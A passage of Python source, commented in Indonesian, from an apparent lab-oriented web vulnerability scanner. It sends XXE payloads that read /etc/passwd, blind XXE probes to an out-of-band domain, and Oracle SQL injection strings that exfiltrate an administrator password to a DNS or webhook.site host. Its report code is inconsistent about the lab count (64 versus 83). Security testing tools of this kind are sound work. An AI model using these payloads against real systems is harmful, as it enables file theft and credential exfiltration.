                if acao and acao.strip() == evil_http and acao.strip().lower().startswith("http://"):
                    ev = (f"Origin probe dengan skema http tidak aman ({evil_http}) ke {url} direfleksikan: "
                          f"Access-Control-Allow-Origin={acao!r}"
                          + (f", Access-Control-Allow-Credentials={acac!r}" if acac else "")
                          + ". Bukti berbasis header respons CORS.")
                    self._mark(74, point, ev, "cors_trusted_insecure_protocols")

    # ======================== XXE (konservatif, probe terkontrol & bukti kuat) ========================

    @staticmethod
    def _xxe_file_evidence(text: str) -> bool:
        if not text:
            return False
        # /etc/passwd markers (strong, unambiguous in HTTP response context of XXE file read)
        return bool(re.search(r"\broot:[^:\n\r]*:0:0:", text))

    def _xxe_post_targets(self, pages: list[Page], points: list[Point]) -> list[tuple[str, str, dict[str, str] | None]]:
        """Return candidate (url, mode, fields) for XML/form probes. mode: 'xml' or 'form'."""
        out: list[tuple[str, str, dict[str, str] | None]] = []
        seen = set()
        # XML-kind points if any
        for pt in points:
            if pt.kind == "xml" and self._same_origin(pt.url):
                key = ("xml", pt.url, pt.name)
                if key not in seen:
                    seen.add(key)
                    out.append((pt.url, "xmlfield", {pt.name: ""}))
        # forms (prefer POST)
        for page in pages:
            for form in page.forms:
                if not self._same_origin(form.action):
                    continue
                # only non-destructive-looking actions
                if DESTRUCTIVE_PATH_RE.search(urlparse(form.action).path or "/"):
                    continue
                fields = {n: v for n, v, _ in form.fields}
                key = ("form", form.action, ",".join(sorted(fields.keys())[:6]))
                if key in seen:
                    continue
                seen.add(key)
                mode = "xmlbody" if (form.method or "get").lower() == "post" else "formget"
                out.append((form.action, "formpost" if (form.method or "get").lower() == "post" else "formget", fields))
        # also try target URL as XML endpoint candidate
        if self.target_url and self._same_origin(self.target_url):
            key = ("xml", self.target_url, "")
            if key not in seen:
                out.append((self.target_url, "xmlbody", None))
        # prioritize likely XML/stock/product endpoints
        def score(item):
            url = item[0].lower()
            s = 0
            for kw in ("stock", "product", "xml", "check", "api", "soap", "feed"):
                if kw in url:
                    s += 2
            if item[1] in ("xmlbody", "xmlfield"):
                s += 2
            return -s
        out.sort(key=score)
        return out[:10]

    def _post_xml(self, url: str, xml_body: str) -> Response:
        return self._request("POST", url, data=xml_body,
                             headers={"Content-Type": "application/xml; charset=UTF-8",
                                      "Accept": "application/xml,text/plain,*/*"})

    def phase_xxe(self, pages: list[Page], points: list[Point]) -> None:
        """Deteksi konservatif XXE/XInclude berbasis probe terkontrol.
        Konfirmasi hanya pada bukti kuat dan tidak ambigu: konten file (/etc/passwd, root:x:0:0)
        muncul di respons, atau interaksi OOB terverifikasi untuk payload spesifik. Tanpa bukti kuat,
        lab dibiarkan not_confirmed untuk menghindari false positive."""
        targets = self._xxe_post_targets(pages, points)
        if not targets:
            return

        # 75: XXE external entity retrieve files (in-band)
        if 75 not in self._confirmed:
            payload = ('<?xml version="1.0" encoding="UTF-8"?>'
                       '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
                       '<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>')
            for url, mode, fields in targets:
                if 75 in self._confirmed or not self._within_budget():
                    break
                if mode == "formpost" and fields is not None:
                    # try putting entity ref in each field value via XML body wrapper too; and as form param
                    resp = self._post_xml(url, payload)
                elif mode == "formget":
                    continue
                else:
                    resp = self._post_xml(url, payload)
                if self._xxe_file_evidence(resp.text):
                    ev = (f"Respons dari {url} memuat konten file (/etc/passwd, indikator root:x:0:0) setelah payload "
                          f"XXE external entity. Bukti berbasis respons in-band.")
                    point = Point(key="xxe", kind="xml", label=f"endpoint {url}", url=url, name="body", original="",
                                  page_url=url, method="POST", interest=6)
                    self._mark(75, point, ev, "xxe_external_entity_file_read")
                    break

        # 81: XInclude to retrieve files (inject into parameter placed into XML context)
        if 81 not in self._confirmed:
            xinc = ('<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
                    '<xi:include parse="text" href="file:///etc/passwd"/></foo>')
            for url, mode, fields in targets:
                if 81 in self._confirmed or not self._within_budget():
                    break
                if mode == "formpost" and fields:
                    # try as form parameter value
                    for fname in list(fields.keys())[:5]:
                        if 81 in self._confirmed or not self._within_budget():
                            break
                        data = dict(fields)
                        data[fname] = xinc
                        resp = self._request("POST", url, data=data)
                        if self._xxe_file_evidence(resp.text):
                            ev = (f"Respons dari {url} (parameter '{fname}') memuat konten file (/etc/passwd) setelah "
                                  f"injeksi XInclude. Bukti berbasis respons in-band.")
                            point = Point(key="xxe", kind="form", label=f"form {url}", url=url, name=fname, original=fields.get(fname,""),
                                          page_url=url, method="POST", fields=tuple((n,v,"text") for n,v in fields.items()), interest=6)
                            self._mark(81, point, ev, "xxe_xinclude_file_read")
                            break
                # also try raw XML body containing xinclude in a value
                if 81 not in self._confirmed and self._within_budget() and mode in ("xmlbody", "xmlfield", "formpost"):
                    body = f'<?xml version="1.0"?><root><value>{xinc}</value></root>'
                    resp = self._post_xml(url, body)
                    if self._xxe_file_evidence(resp.text):
                        ev = (f"Respons dari {url} memuat konten file (/etc/passwd) setelah payload XInclude dalam body XML. "
                              f"Bukti berbasis respons in-band.")
                        point = Point(key="xxe", kind="xml", label=f"endpoint {url}", url=url, name="body", original="",
                                      page_url=url, method="POST", interest=6)
                        self._mark(81, point, ev, "xxe_xinclude_file_read_xmlbody")

        # 80: Blind XXE to retrieve data via error messages (error leaks file content)
        if 80 not in self._confirmed:
            # reference a path whose resolution in error context can leak file; common: file:///etc/passwd as entity in a way
            # that triggers parsing error revealing content, or file:///nonexistent joined - conservative: look for passwd in any error response
            payload = ('<?xml version="1.0" encoding="UTF-8"?>'
                       '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
                       '<stockCheck><productId>&xxe;</productId></stockCheck>')
            for url, mode, fields in targets:
                if 80 in self._confirmed or not self._within_budget():
                    break
                resp = self._post_xml(url, payload)
                # 80 specifically: data retrieved via error messages. If file content appears together with error-ish response, treat as evidence.
                if self._xxe_file_evidence(resp.text) and (resp.status is not None and resp.status >= 400 or re.search(r"error|exception|xml|parser|entity", resp.text, re.I)):
                    ev = (f"Respons error dari {url} memuat konten file (/etc/passwd) setelah payload XXE, "
                          f"mengindikasikan kebocoran data melalui pesan error. Bukti berbasis respons.")
                    point = Point(key="xxe", kind="xml", label=f"endpoint {url}", url=url, name="body", original="",
                                  page_url=url, method="POST", interest=6)
                    self._mark(80, point, ev, "xxe_blind_error_message_leak")

        # 83: repurposing a local DTD (best-effort; confirm only on strong file-content evidence)
        if 83 not in self._confirmed:
            # common lab payload pattern using local docbookx DTD entity redefinition to emit file content
            payload = ('<?xml version="1.0" encoding="UTF-8"?>'
                       '<!DOCTYPE message ['
                       '<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">'
                       '<!ENTITY % ISOamso \'<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">'
                       '<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">'
                       '&#x25;eval;&#x25;error;\'>'
                       '%local_dtd;'
                       ']><stockCheck><productId>1</productId></stockCheck>')
            for url, mode, fields in targets:
                if 83 in self._confirmed or not self._within_budget():
                    break
                resp = self._post_xml(url, payload)
                if self._xxe_file_evidence(resp.text):
                    ev = (f"Respons dari {url} memuat konten file (/etc/passwd) setelah payload repurposing local DTD. "
                          f"Bukti berbasis respons (kebocoran data teramati).")
                    point = Point(key="xxe", kind="xml", label=f"endpoint {url}", url=url, name="body", original="",
                                  page_url=url, method="POST", interest=6)
                    self._mark(83, point, ev, "xxe_repurpose_local_dtd")

        # 76,77,78: Blind XXE / SSRF via XXE requiring OOB interaction evidence
        if self.oob and getattr(self.oob, "domain", None):
            oob_host = f"{self.oob.token}.{self.oob.domain}"
            oob_url = f"http://{oob_host}/"
            point_oob = Point(key="xxe_oob", kind="xml", label="endpoint XML (OOB)", url=self.target_url,
                              name="body", original="", page_url=self.target_url, method="POST", interest=5)

            def _poll_seen() -> bool:
                try:
                    got = self._poll_oob()
                    return bool(getattr(got, "interactions", None))
                except Exception:
                    return False

            # 77: Blind XXE with out-of-band interaction (external entity)
            if 77 not in self._confirmed:
                payload77 = ('<?xml version="1.0" encoding="UTF-8"?>'
                             f'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{oob_url}"> ]>'
                             '<stockCheck><productId>&xxe;</productId></stockCheck>')
                for url, mode, fields in targets:
                    if 77 in self._confirmed or not self._within_budget():
                        break
                    self._post_xml(url, payload77)
                    if _poll_seen():
                        ev = (f"Interaksi OOB terverifikasi (token/domain OOB tercatat) setelah payload XXE external entity "
                              f"ke {oob_url} dikirim ke {url}. Bukti berbasis interaksi out-of-band.")
                        p = Point(key="xxe_oob", kind="xml", label=f"endpoint {url}", url=url, name="body", original="",
                                  page_url=url, method="POST", interest=6)
                        self._mark(77, p, ev, "xxe_blind_oob_interaction")
                        break

            # 78: Blind XXE with out-of-band interaction via XML parameter entities
            if 78 not in self._confirmed:
                payload78 = ('<?xml version="1.0" encoding="UTF-8"?>'
                             f'<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{oob_url}"> %xxe; ]>'
                             '<stockCheck><productId>1</productId></stockCheck>')
                for url, mode, fields in targets:
                    if 78 in self._confirmed or not self._within_budget():
                        break
                    self._post_xml(url, payload78)
                    if _poll_seen():
                        ev = (f"Interaksi OOB terverifikasi setelah payload XXE parameter entity (%xxe; dideklarasikan & dipanggil) "
                              f"ke {oob_url} dikirim ke {url}. Bukti berbasis interaksi out-of-band.")
                        p = Point(key="xxe_oob", kind="xml", label=f"endpoint {url}", url=url, name="body", original="",
                                  page_url=url, method="POST", interest=6)
                        self._mark(78, p, ev, "xxe_blind_oob_parameter_entity")
                        break

            # 76: Exploiting XXE to perform SSRF attacks (OOB/collaborator interaction as SSRF evidence)
            if 76 not in self._confirmed:
                payload76 = ('<?xml version="1.0" encoding="UTF-8"?>'
                             f'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{oob_url}"> ]>'
                             '<stockCheck><productId>&xxe;</productId></stockCheck>')
                for url, mode, fields in targets:
                    if 76 in self._confirmed or not self._within_budget():
                        break
                    self._post_xml(url, payload76)
                    if _poll_seen():
                        ev = (f"Interaksi OOB/SSRF terverifikasi: parser XML melakukan permintaan ke {oob_url} "
                              f"setelah payload XXE dikirim ke {url}. Bukti berbasis interaksi out-of-band.")
                        p = Point(key="xxe_oob", kind="xml", label=f"endpoint {url}", url=url, name="body", original="",
                                  page_url=url, method="POST", interest=6)
                        self._mark(76, p, ev, "xxe_ssrf_oob_interaction")
                        break

        # 79: Blind XXE exfiltrate data using a malicious external DTD - memerlukan hosting DTD eksternal
        # yang tidak disediakan otomatis oleh engine; tanpa bukti exfiltrasi terverifikasi, tidak dikonfirmasi (anti-FP).
        # 82: XXE via image file upload - memerlukan endpoint upload multipart & crafting file gambar/XML spesifik;
        # tanpa bukti kuat (mis. konten file terungkap) dari alur upload, tidak dikonfirmasi (anti-FP).


    def report(self) -> dict[str, Any]:
        labs = []
        for number, title, key, severity in CATALOG:
            lab_id = lab_id_for(number)
            found = self._confirmed.get(number)
            if found:
                entry = dict(found)
                entry["id"] = lab_id
                entry.setdefault("status", "confirmed")
                entry.setdefault("title", title)
                entry.setdefault("severity", severity)
            else:
                entry = {
                    "id": lab_id,
                    "status": "not_confirmed",
                    "title": title,
                    "method": "not tested / insufficient evidence",
                    "location": "-",
                    "evidence": "Tidak ada bukti cukup/terverifikasi untuk lab ini pada putaran ini.",
                    "severity": severity,
                }
            labs.append(entry)
        return {
            "tool": "SATRIA Engine Scanner",
            "version": __version__,
            "target": self.target_url,
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "catalog_scope": "18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking labs (64 total)",
            "summary": (lambda confirmed_labs: {
                "confirmed": len(confirmed_labs),
                "confirmed_manual": len(confirmed_labs),
                "not_confirmed": len(labs) - len(confirmed_labs),
                "candidates_total": len(labs),
                "observations_total": self.request_count,
                "by_severity": {
                    "critical": sum(1 for x in confirmed_labs if str(x.get("severity","")).lower()=="critical"),
                    "high": sum(1 for x in confirmed_labs if str(x.get("severity","")).lower()=="high"),
                    "medium": sum(1 for x in confirmed_labs if str(x.get("severity","")).lower()=="medium"),
                    "low": sum(1 for x in confirmed_labs if str(x.get("severity","")).lower()=="low"),
                },
                "triage_by_severity": {
                    "critical": sum(1 for x in confirmed_labs if str(x.get("severity","")).lower()=="critical"),
                    "high": sum(1 for x in confirmed_labs if str(x.get("severity","")).lower()=="high"),
                    "medium": sum(1 for x in confirmed_labs if str(x.get("severity","")).lower()=="medium"),
                    "low": sum(1 for x in confirmed_labs if str(x.get("severity","")).lower()=="low"),
                },
            })([item for item in labs if item["status"] == "confirmed"]),
            "labs": labs,
            "scan_stats": {
                "pages_fetched": self.stats["pages_fetched"],
                "injection_points": len(self.points),
                "requests": self.request_count,
                "elapsed_seconds": round(time.monotonic() - self.started, 2),
                "oob_status": self.oob_status,
                "errors": self.stats["errors"][:20],
            },
        }


@dataclass
class OOBPollResult:
    interactions: list[str]
    values: list[str]


def build_xml_body(fields: dict[str, str]) -> str:
    product = fields.get("productId", "1")
    store = fields.get("storeId", "1")
    return (
        '<?xml version="1.0" encoding="UTF-8"?>'
        f"<stockCheck><productId>{product}</productId><storeId>{store}</storeId></stockCheck>"
    )


def xml_hex_encode(value: str) -> str:
    return "".join(f"&#x{ord(ch):X};" for ch in value)


def is_attack_blocked(resp: Response) -> bool:
    if resp.error:
        return False
    low = (resp.text or "").lower()
    return bool(re.search(r"(attack detected|blocked|forbidden|not allowed|access denied|invalid input)", low)) or resp.status in (400, 401, 403, 406, 429)


def collect_interaction_strings(payload: Any, token: str, domain: str) -> list[str]:
    found: list[str] = []

    def walk(value: Any) -> None:
        if isinstance(value, dict):
            for key, item in value.items():
                if isinstance(item, (str, int, float)):
                    text = str(item)
                    if token in text or domain in text:
                        found.append(text)
                walk(item)
        elif isinstance(value, list):
            for item in value:
                walk(item)
        elif isinstance(value, str):
            if token in value or domain in value:
                found.append(value)

    walk(payload)
    cleaned = []
    for item in found:
        cleaned.append(item)
    return [cleaned] if cleaned else []


def extract_exfil_values(interactions: list[str], token: str, domain: str) -> list[str]:
    values: list[str] = []
    for interaction in interactions:
        text = interaction or ""
        if token not in text:
            continue
        # DNS style: <data>.<token>.<domain>
        for match in re.finditer(r"([A-Za-z0-9._%+-]{1,80})\." + re.escape(token) + r"\." + re.escape(domain), text):
            value = match.group(1).strip(".")
            if value and value != token:
                values.append(value.split(".")[0])
        # webhook.site style: https://webhook.site/<token>/<data>
        marker = f"/{token}/"
        if marker in text:
            rest = text.split(marker, 1)[1]
            data = re.split(r"[/?\"' ]", rest, maxsplit=1)[0].strip()
            if data:
                values.append(data)
    return list(dict.fromkeys(v for v in values if v))


def oob_payloads(point: Point, setup: OOBSetup):
    if setup.kind == "webhook_site":
        entity_prefix = f"http://webhook.site/{setup.token}/"
        dom = "webhook.site"
    else:
        entity_prefix = f"http://{setup.token}.{setup.domain}/"
        dom = f"{setup.token}.{setup.domain}"
    doc_interaction = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" + f"<!DOCTYPE root [<!ENTITY % remote SYSTEM \"{entity_prefix}\">%remote;]>"
    doc_exfil = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" + "<!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://'||(SELECT password FROM users WHERE username='administrator')||'." + dom + "/\">%remote;]>"
    pfx = point.original if point.numeric else f"{point.original}'"
    interaction = [
        f"{pfx} UNION SELECT EXTRACTVALUE(xmltype('{doc_interaction}'),'/l') FROM dual-- -",
        f"{pfx}||(SELECT EXTRACTVALUE(xmltype('{doc_interaction}'),'/l') FROM dual)||'",
    ]
    exfil = [
        f"{pfx} UNION SELECT EXTRACTVALUE(xmltype('{doc_exfil}'),'/l') FROM dual-- -",
    ]
    return interaction, exfil

def NULL_EXPR(cols: int, value: str) -> list[str]:
    return [value] + ["NULL"] * (cols - 1)


# ----------------------------------------------------------------------------
# Report & CLI
# ----------------------------------------------------------------------------
def write_report(report: dict[str, Any], output_dir: Path) -> tuple[Path, Path]:
    output_dir.mkdir(parents=True, exist_ok=True)
    json_path = output_dir / "satria_baru_report.json"
    html_path = output_dir / "satria_baru_report.html"
    json_path.write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")
    rows = "\n".join(
        "<tr>"
        f"<td>{html_module.escape(item['id'])}</td>"
        f"<td>{html_module.escape(item['status'])}</td>"
        f"<td>{html_module.escape(item['title'])}</td>"
        f"<td>{html_module.escape(item['location'])}</td>"
        f"<td>{html_module.escape(item['evidence'])}</td>"
        "</tr>"
        for item in report["labs"]
    )
    html_path.write_text(
        "<!doctype html><html><head><meta charset='utf-8'><title>SATRIA Baru SQLi Report</title>"
        "<style>body{font-family:system-ui,Arial;margin:24px;color:#17202b}table{border-collapse:collapse;width:100%}"
        "th,td{border:1px solid #d8e2ea;padding:8px;vertical-align:top}th{background:#edf3f8}"
        ".confirmed{color:#0b7a3b;font-weight:700}.not_confirmed{color:#7a5a12}</style></head><body>"
        "<h1>SATRIA Engine — SQLi, XSS, CSRF & Clickjacking (83 Lab)</h1>"
        f"<p>Target: <code>{html_module.escape(report['target'])}</code> &middot; "
        f"Terkonfirmasi: <b>{report['summary']['confirmed']}/64</b></p>"
        "<table><thead><tr><th>Lab</th><th>Status</th><th>Judul</th><th>Lokasi</th><th>Bukti</th></tr></thead>"
        f"<tbody>{rows}</tbody></table>"
        "<p><small>Status 'not_confirmed' berarti bukti tidak cukup; bukan klaim tidak rentan.</small></p>"
        "</body></html>",
        encoding="utf-8",
    )
    return json_path, html_path


def scan_target(
    target_url: str,
    *,
    authorized: bool = False,
    allow_private: bool = False,
    max_pages: int = 20,
    max_points: int = 24,
    max_requests: int = 520,
    timeout: float = 8.0,
    time_delay: float = 3.0,
    oob_domain: str | None = None,
    oob_poll_url: str | None = None,
    oob_webhook_site: bool = False,
) -> dict[str, Any]:
    scanner = SatriaBaruScanner(
        target_url,
        authorized=authorized,
        allow_private=allow_private,
        max_pages=max_pages,
        max_points=max_points,
        max_requests=max_requests,
        timeout=timeout,
        time_delay=time_delay,
        oob_domain=oob_domain,
        oob_poll_url=oob_poll_url,
        oob_webhook_site=oob_webhook_site,
    )
    return scanner.scan()


# ============================================================================
# Adapter kompatibel dengan app.py Streamlit (tanpa mengubah app.py)
# ============================================================================
def _runtime_bool(value: Any) -> bool:
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return value != 0
    return str(value).strip().lower() in {"1", "true", "yes", "y", "on"}


def _normalize_runtime_key(raw_key: Any) -> str:
    key = str(raw_key).strip().lower().replace("-", "_")
    while "__" in key:
        key = key.replace("__", "_")
    return key


_RUNTIME_TARGET_MAP: dict[str, str] = {
    "artifacts_dir": "ARTIFACTS_DIR",
    "output_dir": "ARTIFACTS_DIR",
    "work_dir": "ARTIFACTS_DIR",
    "scrape_path": "SCRAPE_PATH",
    "findings_path": "FINDINGS_PATH",
    "output_pdf": "OUTPUT_PDF",
    "pdf_path": "OUTPUT_PDF",
    "pdf": "OUTPUT_PDF",
    "kiosapi_base_url": "KIOSAPI_BASE_URL",
    "kiosapi_key": "KIOSAPI_API_KEY",
    "kiosapi_api_key": "KIOSAPI_API_KEY",
    "censys_token": "CENSYS_TOKEN",
    "nvd_api_key": "NVD_API_KEY",
    "authorized": "ACTIVE_SCAN_AUTHORIZED",
    "active_scan_authorized": "ACTIVE_SCAN_AUTHORIZED",
    "run_active_tools": "RUN_ACTIVE_TOOLS",
    "run_dir_brute": "RUN_DIR_BRUTE",
    "run_censys": "RUN_CENSYS",
    "run_nvd": "RUN_NVD",
    "enable_llm": "ENABLE_LLM",
    "allow_partial_tools": "ALLOW_PARTIAL_TOOLS",
    "scan_deadline_seconds": "SCAN_DEADLINE_SECONDS",
    "deadline_seconds": "SCAN_DEADLINE_SECONDS",
}
_RUNTIME_BOOL_TARGETS = {
    "ACTIVE_SCAN_AUTHORIZED", "RUN_ACTIVE_TOOLS", "RUN_DIR_BRUTE", "RUN_CENSYS",
    "RUN_NVD", "ENABLE_LLM", "ALLOW_PARTIAL_TOOLS",
}


def configure_runtime(*args: Any, **overrides: Any) -> dict[str, Any]:
    """Terapkan konfigurasi runtime dari app.py.

    Signature kompatibel dengan SATRIA lama: posisi pertama boleh berupa
    Path/string direktori kerja (dipakai app.py), atau mapping/object konfigurasi.
    Keyword yang tidak dikenal diabaikan supaya UI dapat menambah opsi baru.
    """
    incoming: dict[str, Any] = {}
    for idx, arg in enumerate(args):
        if arg is None:
            continue
        if idx == 0 and isinstance(arg, (Path, os.PathLike)):
            incoming["ARTIFACTS_DIR"] = arg
            continue
        if idx == 0 and isinstance(arg, str) and arg.strip() and not _runtime_bool(arg):
            incoming["ARTIFACTS_DIR"] = arg
            continue
        if hasattr(arg, "keys"):
            try:
                incoming.update({str(k): arg[k] for k in arg.keys()})
                continue
            except Exception:
                pass
        if hasattr(arg, "__dict__"):
            incoming.update({str(k): v for k, v in vars(arg).items()})
            continue
        if isinstance(arg, bool):
            incoming["_ignored"] = arg
    incoming.update(overrides)

    applied: dict[str, Any] = {}
    ignored: list[str] = []
    for raw_key, value in list(incoming.items()):
        if raw_key == "_ignored":
            continue
        key = _normalize_runtime_key(raw_key)
        target = _RUNTIME_TARGET_MAP.get(key)
        if target is None:
            ignored.append(str(raw_key))
            continue
        new_value: Any = _runtime_bool(value) if target in _RUNTIME_BOOL_TARGETS else value
        if target == "ARTIFACTS_DIR":
            new_value = Path(str(value)).expanduser()
        elif target == "SCAN_DEADLINE_SECONDS":
            try:
                new_value = float(value)
            except (TypeError, ValueError):
                new_value = 600.0
        elif target in {"SCRAPE_PATH", "FINDINGS_PATH", "OUTPUT_PDF"}:
            new_value = str(value)
        globals()[target] = new_value
        applied[target] = new_value

    # Jika app memberikan direktori artefak, arahkan seluruh artefak ke sana.
    if "ARTIFACTS_DIR" in applied:
        artifact_root = Path(applied["ARTIFACTS_DIR"]).expanduser()
        artifact_root.mkdir(parents=True, exist_ok=True)
        globals()["ARTIFACTS_DIR"] = artifact_root
        if "SCRAPE_PATH" not in applied:
            globals()["SCRAPE_PATH"] = str(artifact_root / "scrape_result.json")
        if "FINDINGS_PATH" not in applied:
            globals()["FINDINGS_PATH"] = str(artifact_root / "findings.json")
        if "OUTPUT_PDF" not in applied:
            globals()["OUTPUT_PDF"] = str(artifact_root / "laporan_kerentanan.pdf")
        applied["ARTIFACTS_DIR"] = artifact_root

    for name, env_key in (("ENABLE_LLM", "SATRIA_ENABLE_LLM"),
                          ("RUN_CENSYS", "SATRIA_RUN_CENSYS"),
                          ("RUN_NVD", "SATRIA_RUN_NVD")):
        if name in applied:
            os.environ[env_key] = "1" if applied[name] else "0"

    _RUNTIME_CONFIG.clear()
    _RUNTIME_CONFIG.update({name: globals().get(name) for name in _RUNTIME_TARGET_MAP.values()})
    _RUNTIME_CONFIG["_ignored"] = ignored
    return dict(_RUNTIME_CONFIG)


def get_runtime_config() -> dict[str, Any]:
    """Snapshot konfigurasi runtime yang sedang aktif."""
    return {name: globals().get(name) for name in _RUNTIME_TARGET_MAP.values()}


def _load_kiosapi_api_key() -> str:
    """Kompatibilitas: app.py meng-overwrite fungsi ini dengan lambda hasil Secrets."""
    return str(globals().get("KIOSAPI_API_KEY") or os.getenv("KIOSAPI_API_KEY") or "")


def _slugify(value: str) -> str:
    parsed = urlparse(value or "target")
    raw = (parsed.netloc or "") + (parsed.path or "") or str(value or "target")
    slug = re.sub(r"[^A-Za-z0-9._-]+", "_", raw).strip("._")
    return slug or "target"


def persist_scrape_artifacts(scrape: dict[str, Any]) -> dict[str, Path]:
    """Simpan artefak scraping HTML yang dibutuhkan app.py."""
    data = scrape.get("data", scrape) if isinstance(scrape, dict) else {}
    html_source_field = "html" if isinstance(data.get("html"), str) and data.get("html").strip() else (
        "html-llm" if isinstance(data.get("html-llm"), str) and data.get("html-llm").strip() else "missing"
    )
    html_text = data.get("html") or data.get("html-llm") or ""
    markdown_text = data.get("markdown") or data.get("markdown-llm") or ""
    if not str(html_text).strip():
        raise RuntimeError("Scraper tidak mengembalikan HTML. Tidak membuat laporan tanpa bukti HTML.")
    meta = scrape.get("meta", {}) if isinstance(scrape.get("meta", {}), dict) else {}
    url = meta.get("url") or (scrape.get("url") if isinstance(scrape, dict) else None) or "unknown"
    artifacts_dir = Path(globals().get("ARTIFACTS_DIR") or Path("artifacts")).expanduser()
    artifacts_dir.mkdir(parents=True, exist_ok=True)
    slug = _slugify(str(url))
    html_path = artifacts_dir / f"scrape_{slug}.html"
    md_path = artifacts_dir / f"scrape_{slug}.md"
    meta_path = artifacts_dir / f"scrape_{slug}.meta.json"
    html_path.write_text(str(html_text), encoding="utf-8")
    md_path.write_text(str(markdown_text), encoding="utf-8")
    meta_path.write_text(json.dumps({
        "url": str(url), "meta": meta,
        "saved_at": datetime.now(timezone.utc).isoformat(),
        "html_chars": len(str(html_text)), "markdown_chars": len(str(markdown_text)),
        "html_source_field": html_source_field,
        "html_source_is_full_dom": html_source_field == "html",
        "html_sha256": hashlib.sha256(str(html_text).encode("utf-8", "ignore")).hexdigest(),
    }, indent=2, ensure_ascii=False), encoding="utf-8")
    return {"html": html_path, "markdown": md_path, "meta": meta_path}


def _pdf_escape(text: str) -> str:
    out = []
    for ch in str(text or ""):
        code = ord(ch)
        if ch in "\\()":
            out.append("\\" + ch)
        elif 32 <= code <= 126:
            out.append(ch)
        else:
            out.append("?" if code < 160 else "?")
    return "".join(out)


# ============================================================================
# PDF rendering untuk UI/report (A4, multi-halaman, tabel & ringkasan)
# ============================================================================
_PDF_PAGE_W = 595.0
_PDF_PAGE_H = 842.0
_PDF_MARGIN = 48.0
_PDF_BOTTOM = 54.0
_PDF_TOP = 792.0
_PDF_COLORS = {
    "navy": (0.059, 0.184, 0.278), "navy_dark": (0.043, 0.133, 0.200),
    "teal": (0.055, 0.486, 0.482), "blue": (0.090, 0.412, 0.667),
    "text": (0.102, 0.153, 0.204), "muted": (0.380, 0.459, 0.549),
    "line": (0.792, 0.847, 0.898), "light": (0.949, 0.969, 0.984),
    "light_blue": (0.902, 0.945, 0.973), "white": (1.0, 1.0, 1.0),
    "green": (0.086, 0.502, 0.235), "green_light": (0.882, 0.949, 0.894),
    "amber": (0.478, 0.341, 0.000), "amber_light": (0.992, 0.945, 0.769),
    "red": (0.675, 0.188, 0.165),
}


def _pdf_safe_text(value: Any) -> str:
    text = str(value or "")
    repl = {"\u2014": "-", "\u2013": "-", "\u2192": "->", "\u2022": "-",
            "\u00b7": "-", "\u00b1": "+/-", "\u00d7": "x", "\u2265": ">=",
            "\u2264": "<=", "\u2713": "[x]", "\u2715": "[ ]", "\u00a0": " ",
            "\u2018": "'", "\u2019": "'", "\u201c": '"', "\u201d": '"'}
    for old, new in repl.items():
        text = text.replace(old, new)
    text = unicodedata.normalize("NFKD", text).encode("ascii", errors="ignore").decode("ascii")
    return re.sub(r"\s+", " ", text).strip()


def _pdf_clean_evidence(value: Any, max_len: int = 620) -> str:
    raw = str(value or "-").strip()
    if raw in {"", "-"}:
        return "-"
    raw = re.sub(r"(?is)<!--.*?-->", " ", raw)
    raw = re.sub(r"(?is)<(script|style).*?</\1>", " ", raw)
    raw = re.sub(r"(?is)<[^>]+>", " ", raw)
    raw = html_module.unescape(raw)
    raw = re.sub(r"\s+", " ", raw).strip()
    return snippet(raw, max_len)


def _pdf_escape_text(value: Any) -> str:
    return _pdf_escape(_pdf_safe_text(value))


def _pdf_wrap(text: Any, width_pts: float, font_size: float) -> list[str]:
    safe = _pdf_safe_text(text) or "-"
    max_chars = max(14, int(width_pts / (font_size * 0.52)))
    return textwrap.wrap(safe, width=max_chars, break_long_words=True, break_on_hyphens=False) or [safe]


def _pdf_num(value: float) -> str:
    return f"{float(value):.2f}".rstrip("0").rstrip(".")


def _pdf_rgb(rgb: tuple[float, float, float]) -> str:
    return " ".join(_pdf_num(v) for v in rgb)


class _PdfBuilder:
    def __init__(self) -> None:
        self.pages: list[list[str]] = [[]]
        self.ops: list[str] = self.pages[0]
        self.y: float = _PDF_TOP

    def new_page(self) -> None:
        self.pages.append([])
        self.ops = self.pages[-1]
        self.y = _PDF_TOP

    def rect(self, x: float, y: float, w: float, h: float, color) -> None:
        self.ops.append(f"{_pdf_rgb(color)} rg {_pdf_num(x)} {_pdf_num(y)} {_pdf_num(w)} {_pdf_num(h)} re f")

    def rect_top(self, x: float, top: float, w: float, h: float, color) -> None:
        self.rect(x, top - h, w, h, color)

    def line(self, x1: float, y1: float, x2: float, y2: float, color, width: float = 0.7) -> None:
        self.ops.append(f"{_pdf_num(width)} w {_pdf_rgb(color)} RG {_pdf_num(x1)} {_pdf_num(y1)} m {_pdf_num(x2)} {_pdf_num(y2)} l S")

    def text(self, x: float, baseline: float, text: Any, size: float = 9.0, color=None, bold: bool = False) -> None:
        color = color or _PDF_COLORS["text"]
        font = "/F2" if bold else "/F1"
        self.ops.append(f"BT {font} {_pdf_num(size)} Tf {_pdf_rgb(color)} rg {_pdf_num(x)} {_pdf_num(baseline)} Td ({_pdf_escape_text(text)}) Tj ET")

    def ensure(self, height: float) -> None:
        if self.y - height < _PDF_BOTTOM:
            self.new_page()

    def paragraph(self, x: float, width: float, text: Any, size: float = 9.0, color=None, bold: bool = False, leading: float | None = None, space_before: float = 0.0) -> float:
        self.y -= space_before
        leading = leading or size * 1.36
        for line in _pdf_wrap(text, width, size):
            self.ensure(size)
            self.y -= leading
            self.text(x, self.y, line, size, color, bold)
        return self.y

